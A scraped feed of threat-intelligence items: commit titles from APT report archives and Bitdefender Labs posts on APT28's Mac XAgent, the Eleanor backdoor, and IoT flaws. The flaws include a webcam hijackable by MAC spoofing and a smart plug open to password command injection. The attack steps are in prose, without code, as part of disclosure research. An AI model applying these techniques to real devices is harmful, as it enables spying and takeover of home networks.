标题,内容,链接
2017.03.06.from-shamoon-to-stonedrill,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.03.06.from-shamoon-to-stonedrill</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/7bff58310be897ae164ec14094ade2f275265ded
2017.02.28.dridexs-cold-war-enter-atombombing,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.28.dridexs-cold-war-enter-atombombing</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/98179000a257851f000f9b98e926ba2cb440aae6
2017.02.27.gamaredon-group-toolset-evolution/,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.27.gamaredon-group-toolset-evolution/</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/b3a6f5a4584f1e1e5b74fb4537fa8e826f89be12
2017.01.15.Bear_Spotting_Vol.1,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.01.15.Bear_Spotting_Vol.1</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/8229bdad6522f754975a2134de8d1da3c195571a
2017.01.19.uri-terror-attack-spear-phishing-emails-targeting-indian-e…,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.01.19.uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/80eefca45d871d8f56e79e49d31e885db142ac5c
2017.02.03.several-polish-banks-hacked,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.03.several-polish-banks-hacked</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/2f2154bbef99f105b7b10c5fcfb5e7dd41ec681e
2017.02.03.kingslayer-a-supply-chain-attack,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.03.kingslayer-a-supply-chain-attack</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/d424ae40b26d6a9b62c7810178fad830b09e4b32
2017.02.10.cyber-attack-targeting-indian-navys-submarine-warship-manu…,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.10.cyber-attack-targeting-indian-navys-submarine-warship-manufacturer</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/7114dca94d6deb5b05ae19e497dfd99fb45ed867
2017.02.15.magic-hound-campaign,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.15.magic-hound-campaign</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/1a85a7921e134fb1ed49ad25c2b785e86c6863b7
2017.02.15.iranian-pupyrat-bites-middle-eastern-organizations,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.15.iranian-pupyrat-bites-middle-eastern-organizations</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/91abb1d26b9cefbe851b146ab4e8ff066a7c4fa6
2017.02.15.the-full-shamoon,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.15.the-full-shamoon</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/3bfb11004287942170af879202c754cf8205a900
2017.02.17.chches-malware,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.17.chches-malware</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/f2c3e35ae367d39d0a655c65469c4ecb2b178991
README.md update,"<pre style=""white-space: pre-wrap; width: 81ex;"">README.md update</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/8b72759fc831110e7ac8182bf36b8084e49b85d5
2017.02.20.Lazarus_False_Flag_Malware,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.20.Lazarus_False_Flag_Malware</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/0eff40973afd75def978a65d6bfc1e03765afa6f
2017.02.21.Additional_Insights_on_Shamoon2,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.21.Additional_Insights_on_Shamoon2</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/d632c478cfc83749fb61507e955ba17c685fbdc4
2017.02.15.deep-dive-dragonok-rambo-backdoor,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.15.deep-dive-dragonok-rambo-backdoor</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/cfa2a3322dfe70f8200a31fa6870359ffb1a3a13
2017.02.22.Spear_Phishing_Mongolian_Government,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.22.Spear_Phishing_Mongolian_Government</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/57de801d5b27ca0089c16736dab27365b5a03912
2017.02.23.APT28_Mac_OS_X_Payload,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.23.APT28_Mac_OS_X_Payload</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/f309edaaff19084a2989020d8b2daa2819e9c82c
2017.02.14.Operation_Kingphish,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.14.Operation_Kingphish</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/9cea6ec1b63fe89e34a11ac4be9ee9b11bd507f0
2017.02.10.Enhanced_Analysis_of_GRIZZLY_STEPPE,"<pre style=""white-space: pre-wrap; width: 81ex;"">2017.02.10.Enhanced_Analysis_of_GRIZZLY_STEPPE</pre>",https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/commit/b0ebeb21bbe3a6aacf2f536e43886d3e01124ac5
Happy New Year!,"<pre style=""white-space: pre-wrap; width: 81ex;"">Happy New Year!</pre>",https://github.com/kbandla/APTnotes/commit/cfe2c8fc2e88d7cb5990a482607a88735d71ab0a
added go dead notification,"<pre style=""white-space: pre-wrap; width: 81ex;"">added go dead notification</pre>",https://github.com/kbandla/APTnotes/commit/49a2af7cd17317b46b74022ed0e4ded6c0e86a40
"ignore me, nothing to see here","<pre style=""white-space: pre-wrap; width: 81ex;"">ignore me, nothing to see here</pre>",https://github.com/kbandla/APTnotes/commit/8d857aa630989dbe550f4a6d40e6da44cd74bbbc
refixing the fix,"<pre style=""white-space: pre-wrap; width: 81ex;"">refixing the fix</pre>",https://github.com/kbandla/APTnotes/commit/ecb318bc6437f41065296a2f4d3d3bace97bf6b5
fixing typo,"<pre style=""white-space: pre-wrap; width: 81ex;"">fixing typo</pre>",https://github.com/kbandla/APTnotes/commit/ee9abc7b61a638ff8d045a9c2a27cb135281b380
adding trend c major blog from 5/18/16,"<pre style=""white-space: pre-wrap; width: 81ex;"">adding trend c major blog from 5/18/16

now available here: https://app.box.com/s/xua6557tccyx7h0ksmjnu8u5bra3z15n</pre>",https://github.com/kbandla/APTnotes/commit/a75f369974c350466f9033a73957de2a3c24624b
adding symantec suckfly blog from 5/17/16,"<pre style=""white-space: pre-wrap; width: 81ex;"">adding symantec suckfly blog from 5/17/16

now available here: https://app.box.com/s/nekeu5y0v2yk4rdwpuq8y1ahyyuaduen</pre>",https://github.com/kbandla/APTnotes/commit/20b1bfbe9fde12a0c527a2f935459bfea432a172
adding ESET op groundbait report,"<pre style=""white-space: pre-wrap; width: 81ex;"">adding ESET op groundbait report

now available here: https://app.box.com/s/hq5t0xjxxbkeulf942ufeiyf3k4zq9b6</pre>",https://github.com/kbandla/APTnotes/commit/9be77250f17ae3d6ef598e369198f79705b720d3
adding bluecoat from seoul to sony report,"<pre style=""white-space: pre-wrap; width: 81ex;"">adding bluecoat from seoul to sony report

now available here: https://app.box.com/s/xyyord0b806e6or2nh92coxw2areyyx4</pre>",https://github.com/kbandla/APTnotes/commit/7e573607adb8da71a3219e7770977cd2b73e3fe6
added CitizenLab Report from April 2016,"<pre style=""white-space: pre-wrap; width: 81ex;"">added CitizenLab Report from April 2016

Between Hong Kong and Burma: Tracking UP007 and SLServer Espionage Campaign

now here: https://app.box.com/s/goyec2m2zwl5fi4sv3ayzwhudcfly1lv</pre>",https://github.com/kbandla/APTnotes/commit/a0166b60401bacd9a079d97edda465cce584c53e
added Arbor Four Element report from April,"<pre style=""white-space: pre-wrap; width: 81ex;"">added Arbor Four Element report from April

now available here: https://app.box.com/s/19ghms2qz9raaquoxu2bh3paoqyx545r</pre>",https://github.com/kbandla/APTnotes/commit/35730032c85f62d7097dd246c8d29cd7ec902e3e
adding Fidelis Turbo Twist report from May 2016,"<pre style=""white-space: pre-wrap; width: 81ex;"">adding Fidelis Turbo Twist report from May 2016

now available here: https://app.box.com/s/ex6wh2qsg1c29sob6f70x1q6eoe3v64w</pre>",https://github.com/kbandla/APTnotes/commit/a18ca8f33ef7bb47006534f7e1112f034e3284a6
added Microsoft PLATINUM Report from April 2016,"<pre style=""white-space: pre-wrap; width: 81ex;"">added Microsoft PLATINUM Report from April 2016

now available here: https://app.box.com/s/ursk78m124t1lagjnu2862kumrnoshcp</pre>",https://github.com/kbandla/APTnotes/commit/656390373c91981c0554006817821f9f9d0fd7ac
added RSA Incident Response: An APT Case Study,"<pre style=""white-space: pre-wrap; width: 81ex;"">added RSA Incident Response: An APT Case Study</pre>",https://github.com/kbandla/APTnotes/commit/90d8c92ce438e66576c63bba1ae4fab317990056
Format changes and updates,"<pre style=""white-space: pre-wrap; width: 81ex;"">Format changes and updates

* Added sha1 hash for all files
* Cleanup some filenames to refect the new format
* Cleanup non-ascii characters in titles</pre>",https://github.com/kbandla/APTnotes/commit/ce11f8b9cbd76ad033320adb21103e45c1047906
added FE 2013 Beebus Report,"<pre style=""white-space: pre-wrap; width: 81ex;"">added FE 2013 Beebus Report

adding: https://www.fireeye.com/blog/threat-research/2013/02/operation-beebus.html

now found: https://app.box.com/s/3bk8cfcjiwhh1gxlkmyslrmp85wm7ewd

had to use direct print to PDF because tables broke in readability</pre>",https://github.com/kbandla/APTnotes/commit/4cacb7ad17d9cfceb076b83b7f33df09eb84747a
added talos needles in haystacks,"<pre style=""white-space: pre-wrap; width: 81ex;"">added talos needles in haystacks

adding: http://blog.talosintel.com/2016/01/haystack.html

now found here: https://app.box.com/s/6tlgwpp0u2lzahlrhtymkp2nnbtd421f

had to do direct print to PDF because tables broke with readability</pre>",https://github.com/kbandla/APTnotes/commit/163d6bd8efa81c41b8fe6661a8eaf892898fba52
adding ESET SSH-Bear,"<pre style=""white-space: pre-wrap; width: 81ex;"">adding ESET SSH-Bear

adding http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/

now found here: https://app.box.com/s/uo31npu9sese34f1ppggmrug48x7rlqp</pre>",https://github.com/kbandla/APTnotes/commit/4582ba5936209c98a02f6eb495713abdf9d614d4
added crowdstrike french connection,"<pre style=""white-space: pre-wrap; width: 81ex;"">added crowdstrike french connection

adding http://www.crowdstrike.com/blog/french-connection-french-aerospace-focused-cve-2014-0322-attack-shares-similarities-2012/

now found here: https://app.box.com/s/yh95vh5l17z2vcffwjvg3v05fzn0pzp1</pre>",https://github.com/kbandla/APTnotes/commit/fb387650d1dda4e0ce3c65d21c4c0beb4be34c4e
adding RSA glassrat,"<pre style=""white-space: pre-wrap; width: 81ex;"">adding RSA glassrat

primarily added for context related to infrastructure relation to other reports

adding: https://blogs.rsa.com/wp-content/uploads/2015/11/GlassRAT-final.pdf

now found here: https://app.box.com/s/3jg797vagekvf1xjyz1j49esdhm4fmjs</pre>",https://github.com/kbandla/APTnotes/commit/2cb423aee3334b99cc5bc59ba41ec895909443fe
Dissecting the APT28 Mac OS X Payload whitepaper available,"<p>Ever since the emergence in 2007 of the APT28 group, Bitdefender has become familiar with the backdoors used to compromise Windows and Linux targets, such as Coreshell, Jhuhugit and Azzy for the former OS or Fysbis for the latter.</p>
<p><span id=""more-3025""></span></p>
<p>Earlier this month, <a href=""https://labs.bitdefender.com/2017/02/new-xagent-mac-malware-linked-with-the-apt28/"">we have been able to finally isolate the Mac OS X counterpart</a> &#8211; the XAgent modular backdoor that was supposeldy delivered via a known dropper associated with the act (the Komplex downloader).</p>
<p>The whitepaper we have prepared will walk you through the inner workings of the XAgent backdoor from its initialization stage to the exfiltration of stolen data. Chapter E is a detailed breakdown of the modules that comprise one of the most advanced threats targeting the Mac operating system to date.</p>
<p>You can <a href=""https://labs.bitdefender.com/wp-content/plugins/download-monitor/download.php?id=Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web.pdf""><strong>download the whitepaper</strong></a> from the Industry Reports section on the Bitdefender website.</p>",https://labs.bitdefender.com/2017/02/dissecting-the-apt28-mac-os-x-payload-whitepaper-available/
New Xagent Mac Malware Linked with the APT28,"<p><a href=""https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf"">APT28</a> operators have upped their game &#8211; the Xagent payload now can target victims running Mac OS X to steal passwords, grab screens and steal iPhone backups stored on the Mac.</p>
<p><span id=""more-3017""></span></p>
<p>Last year <a href=""https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf"">we fully documented</a> what appears to be one of the largest cyber-espionage campaigns ever, allegedly linked to the Russian territory.</p>
<p>The sample we are discussing today has been linked to the Mac OSX version of Xagent component from Sofacy/APT28/Sednit APT. This modular backdoor with advanced cyber-espionage capabilities is most likely planted on the system via the Komplex downloader.</p>
<p>Once successfully installed, the backdoor checks if a debugger is attached to the process. If it detects one, it terminates itself to prevent execution. Otherwise, it waits for an Internet connection before initiating communication with the C&amp;C servers. After the communication has been established, the payload starts the modules.</p>
<p>Our preliminary analysis shows most of the C&amp;C URLs impersonate Apple domains.</p>
<p>Once connected to the C&amp;C, the payload sends a HelloMessage, then spawns two communication threads running in infinite loops. The former uses POST requests to send information to the C&amp;C, while the latter monitors GET requests for commands.</p>
<p><strong>Where do the Mac OS spy modules fall into place?</strong></p>
<p>The analysis reveals the presence of modules that can probe the system for hardware and software configurations, grab a list of running processes and run additional files, as well as get desktop screenshots and harvest browser passwords.</p>
<p>But the most important module, from an intelligence-gathering perspective, is the one that allows the operator(s) to exfiltrate iPhone backups stored on a compromised Mac.</p>
<p><em>All these modules are pending analysis – a detailed paper documenting all the functionalities of the modules will be made available shortly.</em></p>
<p>Our past analysis of samples known to be linked to APT28 group shows a number of similarities between the Sofacy/APT28/Sednit Xagent component for Windows/Linux and the Mac OS binary that currently forms the object of our investigation. For once, there is the presence of similar modules, such as FileSystem, KeyLogger and RemoteShell, as well as a similar network module called HttpChanel.</p>
<p>Other indicators show that today’s sample also reports to a C&amp;C URL that is identical to the Sofacy/APT28/Sednit Komplex OSX Trojan, minus the TLD (apple-[*******].net for Komplex vs apple-[*******].org for Xagent).</p>
<p>Forensic evidence recovered from the binary also reveals identical binary strings in both Komplex and Xagent clients, as follows:</p>
<p>Komplex binary string: “/Users/kazak/Desktop/Project/komplex”<br />
Xagent Mac binary string: &#8220;/Users/kazak/Desktop/Project/XAgentOSX&#8221;</p>
<p>We conclude this brief teaser with the assertion that the Komplex component discovered in September has been exclusively used as a downloader and installer for the Xagent binary.</p>
<p>The investigation is ongoing so there is much we can&#8217;t say yet. Make sure to check back here for an in-depth analysis.</p>
<p><em>Many thanks to Tiberius Axinte, Technical Lead, Antimalware Lab, for documenting the sample.</em></p>",https://labs.bitdefender.com/2017/02/new-xagent-mac-malware-linked-with-the-apt28/
"Smart Webcam Can Go Rogue to Spy on Kids, Bitdefender Finds","<p style=""text-align: left;"">A new smart network camera can be hijacked and turned into a full-fledged spying tool, Bitdefender IoT &amp; malware researchers have discovered.</p>
<p style=""text-align: left;"">As part of their ongoing effort to raise awareness on the serious consequences of security-neglected IoT devices, Bitdefender researchers are constantly analyzing the security posture of various gadgets which may pose privacy and security risks to home users and their networks.</p>
<p style=""text-align: left;""><strong>Device and setup</strong></p>
<p style=""text-align: left;"">The analyzed network camera is a feature-rich monitoring device for homes and small businesses. It includes a motion &amp; sound detection system, two-way audio, built-in microphone and speaker, built-in selectable lullabies to put children to sleep, temperature &amp; humidity sensors and a microSD/SDHC card slot.</p>
<p style=""text-align: left;"">It’s commonly used as a home surveillance system as well as a baby monitor and communication medium between parents and children.</p>
<p style=""text-align: left;"">The device follows the standard setup routine, creating a hotspot during configuration via a wireless network. Once installed, the corresponding mobile application tries to establish a connection with the device’s hotspot and after it detects it, the app connects to it automatically. Next, the app asks the user to introduce the credentials of his home network, which it transmits to the device. The smart plug connects to the local network and the setup process is complete.</p>
<p style=""text-align: left;""><img alt=""screenshot1"" class=""alignnone wp-image-2989"" height=""673"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/11/screenshot1-575x1024.png"" width=""378"" /></p>
<p>Fig 1. Mobile application screenshot</p>
<p><strong>Vulnerabilities</strong></p>
<p>While scrutinizing the device in a controlled testing environment, Bitdefender researchers observed the following security oversights:</p>
<p>The hotspot is open; no password is required.</p>
<p>Data sent between application, device and server is simply encoded, not encrypted.</p>
<p>Network credentials are sent in plain text from mobile app to device.</p>
<p><img alt=""screenshotnetwork"" class=""alignnone wp-image-2991"" height=""115"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/11/screenshotnetwork-1024x218.png"" width=""541"" /></p>
<p>Fig 2. Local network credentials sent in plain-text during configuration</p>
<p><strong>Possible Attacks</strong></p>
<p>When the mobile app connects remotely to the device, from outside the local network, it authenticates through a security mechanism known as a Basic Access Authentication. By today’s security standards, this is considered an insecure method of authentication, unless used in conjunction with an external secure system such as SSL. Usernames and passwords are passed over wire in an unencrypted format, encoded with a Base64 scheme in transit.</p>
<p><em> “Base64 is an encoding scheme, meaning it&#8217;s reversible and virtually useless for providing data security”</em>, says Radu Basaraba, malware researcher at Bitdefender.</p>
<p>Secondly, the device’s communication with the push servers is HTTPS secured, however, authentication of the device is based exclusively on the MAC address.</p>
<p>Every time it starts and at regular intervals, the device sends an UDP message to the authentication server, containing device data, an ID number represented by the MAC address and a 36-character code.  However, the cloud server does not verify the code, it trusts the device’s MAC address to perform the authentication.</p>
<p>Consequently, <strong>an attacker can register a different device, with the same MAC address, to impersonate the genuine one</strong>. The server will communicate with the device that registered last, even if it’s rogue. So will the mobile app. This way, attackers can capture the webcam’s new password, if the user changes the default one.</p>
<p>To speed up the process and grab the password faster, an attacker can take advantage of the camera’s push notification feature. Users can opt to receive notifications on their smartphone, specifically video alerts, whenever the camera detects any suspicious sound or movement in their homes. When the user opens the app to view the alert, the app will authenticate on the device using Basic Access Authentication and, thus, send the new password unencrypted to the hacker-controlled webcam.</p>
<p>Finally, <strong>attackers can enter the username, password and ID to get full control of the user’s webcam, through the mobile app.</strong></p>
<p><img alt=""screenshot3"" class=""alignnone wp-image-2987"" height=""330"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/11/screenshot3-2.png"" width=""351"" /></p>
<p>Fig 3. Push notification message as seen by the user</p>
<p><img alt=""screenshotpush"" class=""alignnone wp-image-2992"" height=""71"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/11/screenshotpush-1024x150.png"" width=""483"" /></p>
<p>Fig 4. Push notification commands</p>
<p><img alt=""screenshot6"" class=""alignnone wp-image-2979"" height=""723"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/11/screenshot6-576x1024.png"" width=""407"" /></p>
<p>Fig 5. Adding stolen user credentials</p>
<p><em>“Anyone can use the app, just as the user would”,</em> George Cabau, antimalware researcher says. “This <em>means turning on audio, mic and speakers to communicate with children while parents aren’t around or having undisturbed access to real-time footage from your kids’ bedroom. Clearly, this is an extremely invasive device, and its compromise leads to scary consequences.”</em></p>
<p><strong>Advice for users</strong></p>
<p>This research shows how exploiting vulnerable IoT devices may have serious consequences for users. Bitdefender advises home users to:</p>
<p>Perform a thorough research before buying an IoT device for their homes. Online reviews may reveal privacy issues other users have encountered.</p>
<p>Test the gadget to understand how it works (if possible). How does it connect to the Internet, what data can it access, where is that data stored and under what circumstances? Proper research into the new device will help users weigh the risks and benefits – can this device turn into a privacy hazard? Using data collected from it, could someone infiltrate the home Wi-Fi network to snoop on private conversations and steal other personal information?</p>
<p>Read the privacy statement before activating the device and connecting it to the web.</p>
<p>Install a <a href=""http://www.bitdefender.com/box/"">home cyber-security solution</a> designed for IoTs. It will scan the whole network to provide anti-phishing protection, malicious-website alerts, detection and quarantining of any malware or rogue users.</p>
<p><strong>Responsible disclosure and status</strong></p>
<p>Bitdefender practiced reasonable disclosure with the vendor of the aforementioned IoT equipment. So, as a matter of course, the vulnerabilities were reported in accordance to Bitdefender’s vulnerability disclosure policy. According to this policy, vendors are officially informed of the findings and encouraged to solve the bugs/flaws in their products. 30 days after the initial reporting, the findings are published.</p>
<p>The problems persist on the latest firmware version (2.02), however the vendor is currently working on a fix.</p>
<p><em>Technical analysis performed by Bitdefender researchers Dragos GAVRILUT, Radu BASARABA and George CABAU.</em></p>",https://labs.bitdefender.com/2016/11/smart-webcam-can-go-rogue-to-spy-on-kids-bitdefender-finds/
Hackers Can Use Smart Sockets to Shut Down Critical Systems,"<p>Users might be risking their privacy, and even physical security, when using smart plugs to manage appliances in homes, office buildings and other spaces. A popular electrical socket is vulnerable to malicious firmware upgrades and can be controlled remotely to expose users to both physical and online security risks, Bitdefender IoT researchers found.</p>
<p>As part of <a href=""http://www.bitdefender.com/files/News/file/Bitdefender-2016-IoT-A4-04_en.pdf"">Bitdefender’s continuous efforts</a> to raise awareness on the security hazards posed by Internet of Things technologies, researchers have performed a new analysis on IoT gadgets and are ready to reveal the findings.</p>
<p>The vulnerable device is a smart electrical switch that plugs into any wall socket and enables users to schedule a connected electronic device on and off from their smartphone. It can power any gadget &#8211; thermostats, smart TVs, coffee makers, security cameras, garage doors, and medical devices and so on.</p>
<p><strong>Configuring the device</strong></p>
<p><img alt=""edimax"" class=""alignnone size-medium wp-image-2950"" height=""300"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/08/edimax-300x300.png"" width=""300"" /></p>
<p>To set up the device, the user needs to plug it in a regular electrical socket. Secondly, he is required to download the corresponding mobile app from Google Play Store or the Apple Store. The mobile app has been downloaded by over 10k Android users alone, at the time of writing.</p>
<p>In the mobile application, the user selects the option to install a new plug and chooses the home Wi-Fi network from the list. The mobile application tries to establish a connection with the device’s hotspot and after it detects it, the app connects automatically. The user is asked to introduce the credentials of his home network, which the app transmits to the device. The smart plug connects to the local network and the setup process is complete.</p>
<p>Next, the device registers to vendor servers through UDP messages containing information on the model, the device name and MAC address. The same data, plus the firmware version, port and local IP address, is sent in reply to the app.</p>
<p><img alt=""fig2"" class=""alignnone size-medium wp-image-2951"" height=""209"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/08/fig2-300x209.png"" width=""300"" /></p>
<p><em>Figure 2. Information sent to application</em></p>
<p><strong>Vulnerability insights</strong></p>
<p>Bitdefender researchers observed that the hotspot is secured with a weak username and password combination. Furthermore, the application does not alert the user to risks associated with leaving default credentials unchanged. Changing them can be done by clicking ‘Edit’ on the name of the smart plug from the main screen and choosing a new name and a new password.</p>
<p>Secondly, researchers noticed that, during configuration, the mobile app transfers the Wi-Fi username and password in clear text over the network. Also, the device-to-application communication that passes through the manufacturer’s servers is only encoded, not encrypted. Encoding can be easily reversed using a scheme that is publicly available, while encryption keeps data secret, locked with a key available for a selected few.</p>
<p><img alt=""3"" class=""alignnone wp-image-2960"" height=""174"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/08/3-1-1024x297.png"" width=""600"" /></p>
<p><em>Figure  3. Device name and password sent unsecured over the network</em></p>
<p>Lastly, a product feature allows the device to be configured to send email notifications to the user every time it switches from one state to another. However, this functionality requires access the user’s email account credentials.</p>
<p><img alt=""fig4"" class=""alignnone wp-image-2955"" height=""133"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/08/fig4-300x67.png"" width=""600"" /></p>
<p><em>Figure 4. Email notification service</em></p>
<p><strong>Possible attacks </strong></p>
<p>In light of the above information, there are two types of cyber-attacks that can be performed. To test the applicability of the attacks, Bitdefender researchers created a test environment – a local network replicating, as accurately as possible, the real conditions in which sensitive data is being communicated.</p>
<p><strong>Password remote control</strong></p>
<p>If an attacker knows the MAC address of the device and the default password, he can gain remote control of the device to re-schedule it, or access all the information the device uses, including the user’s email address and password, if the email notification feature is enabled. This can lead to the full compromise of the linked email account, unless two-factor authentication is enabled.</p>
<p><strong>Firmware upgrade through command injection</strong></p>
<p>The device hashes its own credentials using the MD5 algorithm. Hashing means that, for every input (string of data), a hash delivers a unique value of 32 characters. This is done through the md5sum command, which receives the joined username and password as a parameter.</p>
<p>This method is prone to command injection because the password is not sanitized. Sanitization strips invalid characters typically banned in usernames, passwords or email addresses such as commas, question marks or Unicode characters.</p>
<p>The password, for instance, can contain the “;” symbol that may be misinterpreted as the end of a command. Thus, the initial command ends before “;”, and a command specified in the newly created password will be executed.</p>
<p><img alt=""5"" class=""alignnone wp-image-2957 size-full"" height=""375"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/08/5.png"" width=""600"" /></p>
<p><em>Figure 5. Hashing credentials through md5sum command</em></p>
<p>When an attacker exploits this flaw, the commands specified in the new password overwrite the root password and can open the embedded Telnet service. Using Telnet, an attacker, regardless of his location, can send commands to stop/start/schedule the device, as well as to execute rogue commands, including running malicious firmware to achieve persistence or using the device to perform attacks on other computers or devices inside the local network.</p>
<p><em>“This type of attack enables a malicious party to leverage the vulnerability from anywhere in the world”, </em>says Alexandru Balan, Chief Security Researcher at Bitdefender. <em>“Up until now most IoT vulnerabilities could be exploited only in the proximity of the smart home they were serving, however, this flaw allows hackers to control devices over the Internet and bypass the limitations of the network address translation.</em> <em>This is a serious vulnerability, we could see botnets made up of these power outlets.”</em></p>
<p><img alt=""6"" class=""alignnone wp-image-2958 size-full"" height=""201"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/08/6.png"" width=""596"" /></p>
<p><em>Figure 6. Connecting to Telnet to access the compromised device remotely</em></p>
<p>“<em>One of the most destructive actions an attacker can take is to rip off the existing software and plant malicious software in its place,” </em>says George Cabau, antimalware researcher at Bitdefender. “<em>For users,</em> <em>the consequences can extend to losing control of all their network-connected devices as they become weapons of attack in a cyber-criminal network, as well as to exposing their email accounts and their contents</em>.”</p>
<p><strong>Advice for users</strong></p>
<p>This research reminds users to take into account the security imperfections of Internet of Things devices, because exploiting them may result in serious consequences to their online privacy and even physical security. Bitdefender advises users to:</p>
<p><strong>Perform a thorough research</strong> before buying an IoT device for their homes. Online reviews may reveal privacy issues other users have encountered.</p>
<p><strong>Test the gadget</strong> to understand how it works (if possible). How does it connect to the Internet, what data can it access, where is that data stored and under what circumstances?</p>
<p><strong>Proper research into the new device</strong> will help users weigh the risks and benefits – can this device turn into a privacy hazard? Using data collected from it, could someone infiltrate the home Wi-Fi network to snoop on private conversations and steal other personal information?</p>
<p><strong>Read the privacy statement</strong> before activating the device and connecting it to the web.</p>
<p>Install a <a href=""http://www.bitdefender.com/box/"">home cyber-security solution</a> designed for IoTs. It will scan the whole network to provide anti-phishing protection, malicious-website alerts, detection and quarantining of any malware or rogue users.</p>
<p>Bitdefender is at the forefront of the home integrated cyber-security industry since designing Bitdefender BOX, the first home security solution for connected devices. The BOX solves one of the biggest challenges derived from the IoT market’s complexity and fragmentation – security for “non-classical” devices.  This was made possible by shifting from device-oriented security to a solution able to intercept attacks at their core: the home network.</p>
<p>Thus, Bitdefender BOX provides advanced malware protection for all connected devices &#8211; smartphones, PCs, Macs, home appliances, wearables and others. The product has been recently upgraded with a Vulnerability Assessment feature, which scans devices to pinpoint their security weaknesses, and Active Threat Control, which stops even never-before-seen malware.</p>
<p><strong>Responsible disclosure and status</strong></p>
<p>Bitdefender practiced reasonable disclosure with the vendor of the aforementioned IoT equipment. So, as a matter of course, the vulnerabilities were reported in accordance to Bitdefender’s vulnerability disclosure policy. According to this policy, vendors are officially informed of the findings and encouraged to solve the bugs/flaws in their products. 30 days after the initial reporting, the findings are published.</p>
<p>The vendor is working on a fix to be released in Q3 of 2016.</p>
<p><strong><em>The technical analysis has been performed by Bitdefender researchers Dragos Gavrilut, Radu Basaraba and George Cabau.</em></strong></p>",https://labs.bitdefender.com/2016/08/hackers-can-use-smart-sockets-to-shut-down-critical-systems/
"New Backdoor Allows Full Access to Mac Systems, Bitdefender Warns","<p>A new piece of malware, dubbed <strong>Backdoor.MAC.Eleanor</strong> by Bitdefender researchers, exposes Apple systems to cyber-espionage and full, clandestine control from malicious third-parties.<span id=""more-2900""></span></p>
<p>[<a href=""https://labs.bitdefender.com/wp-content/uploads/2016/07/Backdoor-MAC-Eleanor_final.pdf"">Read the full report here</a>].</p>
<p>The backdoor is embedded into a fake file converter application that is accessible online on reputable sites offering Mac applications and software. The EasyDoc Converter.app poses as a drag-and-drop file converter, but has no real functionality &#8211; it simply downloads a malicious script.</p>
<p><img alt=""app"" class=""aligncenter wp-image-2924"" height=""322"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/07/app-280x300.png"" width=""300"" /></p>
<p>&nbsp;</p>
<p>The script installs and registers the following components to system startup:</p>
<p><strong>Tor Hidden Service </strong></p>
<p>This component creates a Tor hidden service that allows an attacker to anonymously access the control-and-command center from the outside – a local web server dubbed Web Service (PHP) &#8211; via a Tor-generated address.</p>
<p><strong>Web Service (PHP)</strong></p>
<p>This component acts as the C&amp;C  center and gives the attacker full control over the infected machine. The web service is set up locally and can be accessed through the “onion” address. After authenticating with the correct password, attackers gain access to a web-based control panel with the following abilities:</p>
<p>• File manager (view, edit, rename, delete, upload, download, and archive files)<br />
• Command execution (execute commands)<br />
• Script execution (execute scripts in PHP, PERL, Python, Ruby, Java, C)<br />
• Shell via bind/reverse shell connect (remotely execute root commands)<br />
